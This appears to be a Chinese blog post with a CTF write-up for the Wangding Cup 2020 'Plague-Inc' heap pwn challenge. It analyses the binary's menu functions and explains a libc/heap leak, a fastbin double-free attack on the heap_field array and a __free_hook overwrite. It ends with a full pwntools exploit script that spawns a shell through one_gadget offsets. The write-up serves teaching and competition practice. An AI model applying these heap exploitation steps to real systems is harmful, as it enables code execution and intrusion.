---
layout: post
title:  "网鼎杯2020-Plague-Inc"
categories: PWN
tags: PWN
excerpt: 网鼎杯2020-Plague-Inc
mathjax: true
---

* content
{:toc}

### 0x00 网鼎杯2020-Plague-Inc

### 0x01 功能分析

init ： 初始化了14个大小为0x10 的 chunk , 保存 {size , chunk_ptr}

```
  for ( i = 0; i <= 13; ++i )
    heap_field[i] = (signed int *)malloc(0x10uLL);
```

1. add ：index从0开始每次加1, size 有两种 0xa0/0x80 , 每次只能输入8字节 , add 时 如果选择错误的size 依然会分配chunk 即malloc(0),也是分配了0x20的chunk 
```
  v3 = __readfsqword(0x28u);
  puts("The scale of country:");
  puts("1. Large");
  puts("2. Small");
  puts("Your choice:");
  __isoc99_scanf("%1d", &v2);
  if ( v2 == 1 )
  {
    *heap_field[index] = 0xA0;
  }
  else if ( v2 == 2 )
  {
    *heap_field[index] = 0x80;
  }
  else
  {
    puts("Invalid choice.");
  }
  v0 = heap_field[index];
  *((_QWORD *)v0 + 1) = malloc(*heap_field[index]);
```
2. show ： 只有一次 ,使用heap_field 中的size ，write 输出
3. break(edit) ： 只有一次，先show之后才能break ， 输入size记录在heap_field 中， index可指定
4. del ： 任意删除 没有清空堆指针 存在 free_flag , free 后不可以 break 和show


### 0x02 利用思路

看到add中的malloc(0) 就大体知道要在chunk 和 初始heap_field 之间进行混淆，用add 分配到heap_field所在的空间就可以了

1. leak libc + heap : 只有一次show的机会，要碰撞heap_field 肯定也要泄露堆地址。连续free 两个small chunk 就能同时泄露出heap和libc地址  

2. fastbin dup : 利用fastbin 检查double free 时只检查是否和顶块一样的特性，绕过double free 的校验.add时输入不合法的选项,例如4就可以创造一个0x21的fastbin ,因此很容易构造出fastbin attack. 
fastbin attack size 之前都是0x7f => 攻击malloc_hook , 0x56 => 攻击main_arena top chunk指针,0x21 这个size 只好攻击给出的heap_field.

3. 攻击heap_field : fastbin attack 修改fd 指向heap_field,但是可惜的是只能修改8字节，也就是修改size部分，可以在edit 时写入更多的字节。
这时候就是我被坑的点，其实edit 只有一次，如果再把这次edit当作overflow来用就来不及了，已有fastbin attack 可以继续用。

所以这里 要把heap_field 的size 部分接着改成0x21 当作下次fastbin attack伪造size ，进而分配到chunk_ptr 的部分改成free_hook
最后利用唯一的edit修改free_hook为onegadget地址。

4. 题目限制的chunk 数量为14 ，需要节省分配的chunk 数量: 把用于隔离top chunk的chunk 用fastbin 替代，后续也可以再用 。


# leak libc + heap :  free small chunk 再show  ， index 只加不减  ,heap ok
# 利用break 覆盖 fd  申请malloc_hook , fastbin attack ?  修改size 大小
没有fastbin ， house of lore ， 说明UAF 可突破 

可以创造一个 malloc(0) 0x20 的chunk # 5 
de(5)  free(0x80) free(0x20) 不合并 , 

可以创造 malloc(0) 伪造成heap_field ，8 字节指定size ，造成overflow  : 失败 heap_field 初始化指定 并不是用index

攻击目标： heap_field ?

fastbin UAF : 可用 寻找攻击的目标 ， 使用break 伪造chunk malloc 出来 修改size 为0x
申请chunk 

修改 heap_field : 修改fd 指向 heap_field , 修改size 为0x21

### 0x03 exp

```
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
import os
debug = 0
exe = "./pwn"

r = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x)
rud = lambda x:io.recvuntil(x,drop=True)
rul = lambda:io.recvline()
sd = lambda x:io.send(x)
sl = lambda x:io.sendline(x)
sea = lambda x,y:io.sendafter(x,y)
sela = lambda x,y:io.sendlineafter(x,y)

context.terminal = ["tmux","splitw","-h"]
elf = ELF(exe)
context.arch = elf.arch

if debug:
    context.log_level = "debug"

arena64 = 0x3c4b20
arena32 = 0x1b2780

def pre(libc_version=0):
    glibc_dir = '/glibc/{arch}/{libc}/lib/libc-{libc}.so'.format(arch=elf.arch,libc=str(libc_version))
    ld_dir = '/glibc/{arch}/{libc}/lib/ld-{libc}.so'.format(arch=elf.arch,libc=str(libc_version))
    if libc_version==0:
        io = process(exe)
        return io
    else:
        io = process(exe,env={"LD_PRELOAD":glibc_dir})
        cmd = "patchelf --set-interpreter {} {}".format(ld_dir,os.getcwd()+"/"+exe)
        os.system(cmd)
        return io
 
def dbg(breakpoint=0):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[1], 16)if elf.pie else 0 
    if breakpoint!=0:
        gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
        gdb.attach(io, gdbscript)
        time.sleep(1)
    else:
        gdb.attach(io)

if len(sys.argv)>1:
    io = remote(sys.argv[1],int(sys.argv[2]))
    #libc = ELF("./libc.so.6")
else:
    io = pre()
    libc = elf.libc

def add(tp,content):
    # 1=> 0xa0 ,2 => 0x80
    sela("Your choice:\n","1")
    sela("Your choice:\n",str(tp))
    sela(":\n",content)

def show(ind):
    sela("Your choice:\n","4")
    sela(":\n",str(ind))

def de(ind):
    sela("Your choice:\n","2")
    sela(":\n",str(ind))

def edit(ind,contents):
    sela("Your choice:\n","3")
    sela(":\n",str(ind))
    sela("?\n",contents)

add(1,"a"*7) # 0
add(1,"a"*7) # 1
add(1,"a"*7) # 2

add(4,"\x33") # 3

de(0)
de(2)

add(1,"") # 4
show(4)
addr = u64(ru("\x7f")[-6:].ljust(8,"\x00"))
print hex(addr)
libc.address = addr - 0xa +0x78 -arena64 - 88

heap  = u64(ru("\x55")[-6:].ljust(8,"\x00")) - 0x1350
print hex(heap)
one = libc.address+ 0x4526a
m_hook = libc.symbols["__free_hook"]

add(4,"\x55") #5

de(3)
de(5)
de(3)

hp2 = heap+0x40 # 指向heap_field 2 
add(4,p64(hp2)) #6
add(4,p64(0x60)) #7
add(4,p64(0x60)) # 8
add(4,p64(0x21)) #9

de(3)
de(5)
de(3)
add(4,p64(heap+0x40+8)) #10
add(4,"a"*8) #11
add(4,"a"*8) # 12
add(4,p64(m_hook)) # 13
edit(1,p64(one))

de(0)

io.interactive()
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
```


